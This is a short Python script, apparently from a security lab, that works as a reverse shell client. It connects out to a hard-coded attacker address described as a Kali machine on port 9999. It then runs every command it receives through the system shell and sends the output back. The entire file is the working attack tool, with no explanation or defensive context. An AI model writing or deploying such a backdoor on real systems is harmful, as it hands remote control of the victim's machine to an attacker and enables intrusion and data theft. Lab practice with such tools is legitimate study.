import socket
import subprocess

# Change HOST to Kali's IP
HOST = '192.168.2.76'
PORT = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    if command.strip() == "":
        continue
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    if not output:
        output = b"Command executed with no output."
    client.send(output)

client.close()
